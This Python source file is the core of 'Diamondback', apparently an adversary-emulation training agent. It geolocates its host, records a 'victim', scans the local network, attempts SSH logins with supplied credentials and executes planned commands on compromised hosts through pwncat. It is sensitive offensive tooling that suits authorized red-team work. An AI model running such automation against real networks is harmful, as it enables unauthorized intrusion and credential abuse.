import copy
import glob
import logging
import multiprocessing
import os
import random
import sys
import threading
import time
import traceback

import cpuinfo
import psutil

from sqlalchemy import create_engine
from sqlalchemy import desc
from sqlalchemy.ext.declarative import declarative_base  
from sqlalchemy.orm import sessionmaker, backref, Session

from datetime import datetime
from sqlalchemy import Column, Integer, String, Float, DateTime, ForeignKey, Table
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column, relationship, Session
from typing import List, Optional

import pwncat
from pwncat.manager import Manager 

from connection import *
from connection.ssh import *
from diamondback.action.factory import ActionFactory

from action import *
from diamondback.action.network.ssh import SSHConnectionAttempt
from action.scan.arp import ARPScan
from action.scan.icmp import ICMPScan
from diamondback.action.internal.sleep import Sleep
from action.execute import SSHCommandExecution
from support import *
from domain import *
from history_meta import versioned_session

import requests
import json
from datetime import datetime
from typing import Dict, Optional

ALLOWED_DATA_FILES =    [
                            'credential.json'
                        ]
DATA_DIRECTORY = os.path.join( os.path.abspath(os.path.dirname(os.path.dirname(__file__))), 'data' )
class Client:
    def __init__( self, context=None, stop_event=None, hosts=None, network=None ):
        self.context            = context
        self.startup_time       = time.time( )
        self.cpu_info           = cpuinfo.get_cpu_info()
        self.available_memory   = int(psutil.virtual_memory()[0]/1024)/1024
        self.logger             = logging.getLogger( 'client' )
        self.use_targeting      = False
        self.my_location        = None
        self.current_victim     = None
        if hosts:
            self.set_hosts( hosts.split(",") )
        else:
            self.set_hosts( [] )

        self.targets = {}

        if network:
            logging.info( f'set network address to {network}' )
            self.set_network( network )
        else:
            self.set_network( None )

        self.path_to_configuration    = os.path.join( PARENT_DIRECTORY, DEFAULT_CONFIGURATION_FILE )

        if not context:
            self.configuration = read_properties( self.path_to_configuration )
            self.context = None
        else:
            self.configuration = self.context.obj['CONFIGURATION']

        self.configuration_serial = copy.copy( self.configuration.getint('general','serial') ) 

        if not stop_event:
            self.stop_event = threading.Event( )
        else:
            self.stop_event = stop_event
        # Create queue for return value
        self.action_results = multiprocessing.Queue()

        database                   = self.configuration.get( 'database', 'url' )
        database_type              = self.configuration.get( 'database', 'type' )
        try:
            username                   = self.configuration.get( 'database', 'username' )
            hostname                   = self.configuration.get( 'database', 'host' )
            password                   = self.configuration.get( 'database', 'password' )
        except:
            pass

        self.engine = create_engine( f"{database_type}:///{database}", connect_args={"check_same_thread": False} )
        Session = sessionmaker( self.engine )  

        # Wrap your session inside a versioned_session
        versioned_session(Session)            
        self.session = Session( )

        # Create all tables
        self.logger.info("Creating database schema...")
        Base.metadata.create_all(self.engine)
        
        self.actions_log    = []

        self.pwncat_manager = Manager()

        self.load_data(  )

    def load_data( self ):
        self.logger.info( 'loading operational data' )
        for f in glob( os.path.join(DATA_DIRECTORY, "*.json") ):
            if os.path.basename(f) in ALLOWED_DATA_FILES:
                self.logger.info(f)
                t = os.path.basename(f).split(".")[0]
                f = os.path.join( DATA_DIRECTORY, f )
                self.logger.info( f"examining {f}" )
                with open( f, 'r' ) as reader:
                    data = json.load(reader)
                    if t.lower() == "credential":
                        self.logger.info( "parsing credentials" )

    def set_targets( self, targets ):
        self.targets = targets

    def get_targets( self ):
        return self.targets
    
    def add_target( self, key, target_object ):
        self.get_targets()[key] = target_object

    def update_targets( self, target_set ):
        self.targets = self.targets | target_set

    def set_network( self, network ):
        print( network )
        self.network = network
    
    def set_using_targeting( self, flag=True ):
        self.use_targeting = flag
    
    def should_use_targeting( self ):
        return self.use_targeting

    def get_network( self ):
        return self.network

    def get_pwncat_manager( self ):
        return self.pwncat_manager

    def get_username( self ):
        if self.context and self.context.obj:
            return self.context.obj['USERNAME']
    
    def get_password( self ):
        if self.context and self.context.obj:
            return self.context.obj['PASSWORD']

    def add_action( self, action ):
        self.actions_log.append( action )

    def set_hosts( self, hosts ):
        print(hosts)
        self.hosts = hosts
    
    def get_hosts( self ):
        return self.hosts
    
    def update_hosts( self, new_hosts ):
        self.get_hosts().extend( new_hosts )

    def set_stop_event( self, event ):
        self.stop_event = event
    
    def get_stop_event( self ) -> threading.Event:
        return self.stop_event

    def get_startup_time( self ):
        return self.startup_time

class Diamondback( Client ):
    def __init__( self, context=None, stop_event=None, mode=None, skip_discovery=False, hosts=None, network=None ):
        super().__init__( context, stop_event=stop_event, hosts=hosts, network=network )
        self.logger = logging.getLogger( 'diamondback' )
        self.set_mode( mode )
        self.skip_discovery = skip_discovery
        self.logger.info( 'initialized diamondback training agent...' )
        self.operation_plan = {}

        # Discover all actions (happens automatically on first create)
        discovered = ActionFactory.discover_actions()
        self.logger.info(f"Discovered {len(discovered)} action classes:")
        for name in ActionFactory.list_actions():
            self.logger.info(f"  - {name}")        
    
        self.hosts_to_ignore = self.configuration.get('execution','ignore').split(",")
        self.logger.info( f'ignoring the following targets: {self.hosts_to_ignore}' )

        lia = self.get_local_ip_address( )
        self.logger.info( f"determined local ip address of this host is {lia}, dont ever target this host" )
        self.hosts_to_ignore.append( self.get_local_ip_address() )

        self.my_launch_event = LaunchEvent( )
        self.my_launch_event.current_address = self.get_local_ip_address( )
        (gateway,interface) = self.get_default_gateway( )
        self.my_launch_event.network_gateway = gateway
        self.my_launch_event.network_interface = interface

    def set_operation_plan( self, opplan ):
        self.operation_plan = opplan
    
    def get_operation_plan( self ):
        return self.operation_plan

    def query_public_ip_info(self, ip_address: Optional[str] = None, 
                            timeout: int = 10,
                            use_backup: bool = True) -> Dict:
        """
        Query public IP address information from online services.
        
        Args:
            ip_address: Specific IP to query. If None, queries your own public IP.
            timeout: Request timeout in seconds.
            use_backup: If True, tries backup service if primary fails.
        
        Returns:
            Dictionary containing IP information.
        """
        self.logger.info( 'lookup details about this location Internet facing IP' )
        
        # Primary service: ipapi.co (no API key required for basic usage)
        primary_url = f"https://ipapi.co/{ip_address or ''}/json/"
        
        # Backup service: ipinfo.io (allows limited requests without API key)
        backup_url = f"https://ipinfo.io/{ip_address or ''}/json"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        try:
            # Try primary service
            response = requests.get(primary_url, headers=headers, timeout=timeout)
            response.raise_for_status()
            data = response.json()
            
            # Normalize data from ipapi.co
            result = {
                'ip': data.get('ip'),
                'hostname': data.get('hostname'),
                'city': data.get('city'),
                'region': data.get('region'),
                'country': data.get('country_name'),
                'country_code': data.get('country_code'),
                'postal_code': data.get('postal'),
                'latitude': data.get('latitude'),
                'longitude': data.get('longitude'),
                'timezone': data.get('timezone'),
                'org': data.get('org'),
                'asn': data.get('asn'),
                'service': 'ipapi.co',
                'raw_response': data
            }
            
        except (requests.RequestException, json.JSONDecodeError) as e:
            if not use_backup:
                raise Exception(f"Failed to query IP information: {str(e)}")
            
            try:
                # Try backup service
                response = requests.get(backup_url, headers=headers, timeout=timeout)
                response.raise_for_status()
                data = response.json()
                
                # Normalize data from ipinfo.io
                loc = data.get('loc', ',').split(',')
                lat = float(loc[0]) if len(loc) > 0 and loc[0] else None
                lon = float(loc[1]) if len(loc) > 1 and loc[1] else None
                
                result = {
                    'ip': data.get('ip'),
                    'hostname': data.get('hostname'),
                    'city': data.get('city'),
                    'region': data.get('region'),
                    'country': data.get('country'),
                    'country_code': data.get('country'),
                    'postal_code': data.get('postal'),
                    'latitude': lat,
                    'longitude': lon,
                    'timezone': data.get('timezone'),
                    'org': data.get('org'),
                    'asn': None,  # ipinfo.io doesn't provide ASN in free tier
                    'service': 'ipinfo.io',
                    'raw_response': data
                }
                
            except Exception as backup_error:
                raise Exception(f"Both services failed. Primary: {str(e)}, Backup: {str(backup_error)}")
        if result:
            self.logger.info( f'found {result["ip"]}' )
        return result

    def store_ip_info(self, ip_data: Dict) -> Location:
        """
        Store IP information in the database using an active SQLAlchemy session.
        
        Args:
            session: Active SQLAlchemy session
            ip_data: Dictionary containing IP information
        
        Returns:
            IPAddressInfo instance that was stored
        """
        ip_info = Location(
            ip=ip_data.get('ip'),
            hostname=ip_data.get('hostname'),
            city=ip_data.get('city'),
            region=ip_data.get('region'),
            country=ip_data.get('country'),
            country_code=ip_data.get('country_code'),
            postal_code=ip_data.get('postal_code'),
            latitude=ip_data.get('latitude'),
            longitude=ip_data.get('longitude'),
            timezone=ip_data.get('timezone'),
            org=ip_data.get('org'),
            asn=ip_data.get('asn'),
            raw_data=ip_data.get('raw_response')
        )
        
        self.session.add(ip_info)
        self.session.commit()
        
        return ip_info

    def set_mode( self, mode ):
        self.mode = mode
    
    def get_mode( self ):
        return self.mode

    def set_commands( self, commands ):
        self.commands = commands

    def get_commands( self ):
        return self.commands

    def lookup_host_by_address( self, address ):
        self.logger.info( f'lookup host {address}' )
        return self.session.query( Target ).filter( Target.address == address ).first( )

    def does_host_exist( self, target ):
        h = self.session.query( Target ).filter( Target.address == target ).exists( )

    def save_target( self, target ):
        new_target = Target( )

        new_target.address = target

        self.session.add( new_target )
        self.session.commit( )
        return new_target
    
    def __del__( self ):
        if self.session:
            self.logger.info( "closing database details" )
            self.session.close( )

    def lookup_ip_details( self, current_ip ):
        self.logger.info( f'lookup location details by IP address: {current_ip}' )
        return self.session.query( Location ).filter( Location.ip == current_ip ).first( )

    def get_local_ip_address( self ):
        """
        Retrieves the local network IP address of the current machine.
        """
        try:
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Connect to an external address (doesn't send data, just establishes a connection
            # to get the local IP used for outbound connections)
            s.connect(("8.8.8.8", 80))  # Google's public DNS server
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except socket.error as e:
            self.logger.info(f"Error getting local IP address: {e}")
            return None

    def lookup_victim_by_location( self, location : Location ) -> Victim:
        victim = self.session.query( Victim ).filter( Victim.location == location ).first( )

        if not victim:
            self.logger.info( f"did not locate any victim for the location {location}" )

            victim = Victim( )

            victim.location = location

            self.session.add( victim )
            self.session.commit( )

        return victim

    def get_default_gateway( self ) -> Optional[Tuple[str, str]]:
        """
        Get default gateway using 'ip route' command.
        Returns gateway IP and interface name.
        
        Returns:
            Tuple of (gateway_ip, interface) or None
        """
        try:
            result = subprocess.run(
                ['ip', 'route', 'show', 'default'],
                capture_output=True,
                text=True,
                check=True
            )
            
            # Parse: "default via 192.168.1.1 dev eth0 proto dhcp metric 100"
            match = re.search(r'default via (\S+)(?: dev (\S+))?', result.stdout)
            if match:
                gateway = match.group(1)
                interface = match.group(2) if match.group(2) else "unknown"
                return (gateway, interface)
        except (subprocess.CalledProcessError, FileNotFoundError):
            return None
        return None

    def __del__( self ):
        self.logger.info( "cleanup dangling files (e.g., malware)" )
        paths_to_clear =    [
                                os.path.join( PARENT_DIRECTORY, "docker", "payloads" )
                            ]
        
        for p in paths_to_clear:
            delete_all_files( p )

    def perform_initial_planning( self ):
        self.logger.info( 'perform initial startup steps...' )

        my_ip_info = self.query_public_ip_info()
        self.my_location = None
        try:
            self.my_location = self.lookup_ip_details( my_ip_info['ip'] )
        except:
            self.logger.warning( "failed to lookup local Internet accessible IP details" )
            self.logger.warning( traceback.format_exc() )

        if not self.my_location:
            self.logger.info( 'no record of this location, store one now please' )
            self.ipaddress_details = self.store_ip_info( my_ip_info )
            self.my_location = self.ipaddress_details
        else:
            self.logger.info( f'using previously stored record of this location {self.my_location}' )
            self.ipaddress_details = self.my_location

        if self.my_launch_event:
            self.logger.info( 'set location record for this launch event' )
            self.my_launch_event.location = self.my_location
            self.session.commit( )

        self.current_victim = self.lookup_victim_by_location( self.my_location )
        self.logger.info( 'set current victim' )
        if self.my_location.ip:
            if not self.current_victim.internet_facing_ip:
                self.logger.info( 'update victim details to reflect IP address information' )
                self.current_victim.internet_facing_ip = self.my_location.ip
                self.current_victim.has_internet = True
            else:
                self.current_victim.has_internet = False
        self.current_victim.launch_events.append( self.my_launch_event )
        self.my_launch_event.victim = self.current_victim
        self.session.commit( )

    def hunt_for_targets( self, actions=[] ):
        self.perform_initial_planning( )        

        arguments = {
                        "session": self.session,
                        "location": self.my_location,
                        "stop_event": self.stop_event,
                        "configuration": self.configuration,
                        "context": self.context,
                        "network": self.get_network( ),
                        "username": self.get_username(),
                        "password": self.get_password()
                    }

        for a in actions:
            try:
                action_arguments = a | arguments

                next_action = ActionFactory.create(a['name'], **action_arguments)
                if next_action.should_skip():
                    self.logger.info("opplan has configured skipping this action")
                    time.sleep( 10 )
                else:
                    next_action.run( )
                    if next_action.get_output():
                        if 'update_host' in a and a['update_host']:
                            if next_action and next_action.get_output():
                                self.logger.info( next_action.get_output() )
                                self.update_hosts( next_action.get_output() )                        
            except:
                self.logger.error( traceback.format_exc() )

        self.logger.info( "examine live hosts for connectivity" )
        for host in self.get_hosts( ):
            self.logger.info( f"examining host {host}, does this target support SSH?" )
            ssh_connection_arguments =  {
                                            "input" : host
                                        }
            action_arguments = ssh_connection_arguments | arguments
            ssh_connection = SSHConnectionAttempt( **action_arguments ).run( )
            if ssh_connection.get_output( ):
                self.logger.info( f"SSH connection successful! New target ID->{ssh_connection.captured_target.id}" )
                
                ssh_connection.captured_target.victim_id = self.current_victim.id
                ssh_connection.captured_target.discovery_method = ssh_connection.__class__.__name__
                ssh_connection.captured_target.hardware_address = get_mac( host )
                ssh_connection.captured_target.connection = "ssh"
            else:
                self.logger.info( "SSH connection failure" )

        self.session.commit( )

    def lookup_targeting_data( self ):
        self.logger.info( f"lookup all current targets for the victim {self.current_victim.id}" )
        possible_targets = self.session.query( Target ).filter( Target.victim == self.current_victim ).all( )
        targets = []
        for p in possible_targets:
            targets.append( p.address )
        return targets

    def run( self ):
        self.logger.info( 'agent run() started' )

        def check_for_updated_configuration():
            self.logger.info( 'checking configuration for any updates....' )
            new_configuration = read_properties( self.path_to_configuration )
            self.logger.info( 'configuration read' )
            new_serial  = new_configuration.getint('general','serial')
            if new_serial > self.configuration_serial:
                self.logger.info( "******** UPDATE CONFIGURATION! **********")
                self.configuration = new_configuration     

        self.logger.info( 'add check for updated configuration' )
        timer_object = threading.Timer( self.configuration.getint('execution','config_check'), 
                                        check_for_updated_configuration )
        timer_object.start( )

        self.perform_initial_planning( )
        
        if "actions" in self.get_operation_plan():
            arguments = {
                            "session": self.session,
                            "location": self.my_location,
                            "stop_event": self.stop_event,
                            "target_address": self.network,
                            "configuration": self.configuration,
                            "context": self.context,
                            "username": self.get_username(),
                            "password": self.get_password()
                        }
            chosen_integer = random.randint( 2048, 3096 )
            registered_objects = {}
            self.special_values = {}
            for a in self.get_operation_plan()["actions"]:
                try:
                    next_action = None
                    argument_table = {}

                    self.logger.info( f"executing next action {a['name']}" )
                    if "loop" in a and a["loop"]:
                        if 'name' not in a:
                            a['name'] = 'loop'
                        self.logger.info( f"starting loop {a['name']}" )
                        loop_actions = a["actions"]
                        targets = []
                        if self.should_use_targeting( ):
                            self.logger.info( "use targeting details stored in database to speed up processing" )
                            targets = self.lookup_targeting_data( )
                        else:
                            if a["target"].lower() == "host":
                                targets = self.get_hosts()
                            elif a["target"].lower() == "target":
                                targets = self.get_targets()
                            
                        for t in targets:
                            if t not in self.hosts_to_ignore:
                                self.logger.info( f'examining potential target {t}' )
                                for la in loop_actions:
                                    la["input"] = t

                                    for (key,value) in la.items():
                                        if type(value) == str and value.find("random") != -1 and value.find("random}") == -1:
                                            self.logger.info( f'found random marker in {value}' )
                                            base_value = parse_increment_regex( 'random',value )
                                            substring = "{random:%s}" % str(base_value)
                                            self.logger.info( f'replace the following substring:{substring}')
                                            special_key = f"{la['name']}-random"
                                            if special_key in self.special_values:
                                                self.special_values[special_key] += 1
                                                self.logger.info( f'begin tracking special value {special_key} at {self.special_values[special_key]}' )
                                            else:
                                                random_value = random.randint( base_value, base_value+len(targets)+25 )
                                                while is_port_in_use( random_value ):
                                                    self.logger.info( "if this a netowrk port its already in use, try 1 higher plz" )
                                                    random_value += 1

                                                self.special_values[special_key] = random_value
                                                self.logger.info( f'update special value {special_key} to {self.special_values[special_key]}' )
                                            value = value.replace( substring,str(self.special_values[special_key]) )
                                            la[key] = value
                                        elif type(value) == str and value.find("replace") != -1:
                                            self.logger.info( 'found replace marker' )
                                            replace_with = parse_string_parameter( value, "replace" )
                                            substring = "{replace:%s}" % str(replace_with)

                                            self.logger.info( f'replace the following substring:{substring}')
                                            special_key = f"{replace_with}"
                                            
                                            value = value.replace( substring,str(self.special_values[special_key]) )
                                            la[key] = value
                                        elif type(value) == str and value.find("increment") != -1:
                                            self.logger.info( 'found increment marker' )
                                            base_value = parse_increment_regex('increment',value)
                                            substring = "{increment:%s}" % str(base_value)
                                            self.logger.info( f'replace the following substring:{substring}')
                                            special_key = f"{la['name']}-increment"
                                            if special_key in self.special_values:
                                                self.special_values[special_key] += 1
                                                self.logger.info( f'begin tracking special value {special_key} at {self.special_values[special_key]}' )
                                            else:
                                                self.special_values[special_key] = base_value
                                                self.logger.info( f'update special value {special_key} to {self.special_values[special_key]}' )
                                            value = value.replace( substring,str(self.special_values[special_key]) )
                                            self.logger.info( f'replaced with {value}')
                                            la[key] = value

                                    unique_key = f"{la['name']}:{la['input']}"
                                    argument_table = arguments | la

                                    if la['name'] == "DirectExecute":
                                        try:
                                            self.logger.info('execute a direct action using a previous action connection')
                                            target_object = registered_objects[la['using']]
                                            if target_object:
                                                self.logger.info( 'found previous action' )
                                                command = la['command'].format( **la )
                                                self.logger.info( command )
                                                target_object.get_connection().execute( command )
                                        except:
                                            self.logger.warning(f"cannot find a previous action named {la['using']}")
                                    else:
                                        next_action = ActionFactory.create(la['name'], **argument_table)
                                        if next_action.should_skip():
                                            self.logger.info("opplan has configured skipping this action")
                                            time.sleep( 10 )
                                        else:
                                            next_action.run( )
                                            if next_action.should_register():
                                                registered_objects[next_action.get_registration_key()] = next_action

                                            if next_action.get_output():
                                                t        = self.lookup_host_by_address(la["input"])
                                                t.victim = self.current_victim
                                                self.session.commit( )
                                                self.get_targets()[la["input"]] = t
                                                self.current_victim.targets.append( t )
                                                self.session.commit( )
                            else:
                                self.logger.warning( f"********** configuration has me skipping the target {t}" )
                    else:
                        self.logger.info( 'executing top-level normal action' )
                        argument_table = arguments | a 
                        next_action = ActionFactory.create(a['name'], **argument_table)
                        if next_action.should_skip():
                            self.logger.info("opplan has configured skipping this action")
                            time.sleep( 10 )
                        else:
                            next_action.run( )

                    if 'update_host' in a and a['update_host']:
                        if next_action and next_action.get_output():
                            self.logger.info( next_action.get_output() )
                            self.update_hosts( next_action.get_output() )
                except KeyboardInterrupt:
                    self.stop_event.set( )
                except:
                    self.logger.error( traceback.format_exc() )
                    self.stop_event.set( )
                finally:
                    if len(self.targets) > 0:
                        self.logger.info( self.targets )
            self.logger.info( 'processing of opplan completed.. close any registered connection/actions' )
            for (k,i) in registered_objects.items():
                if i:
                    try:
                        i.get_connection().close( )
                    except:
                        self.logger.warning( f'failed to close a connection on {i.get_name()}' )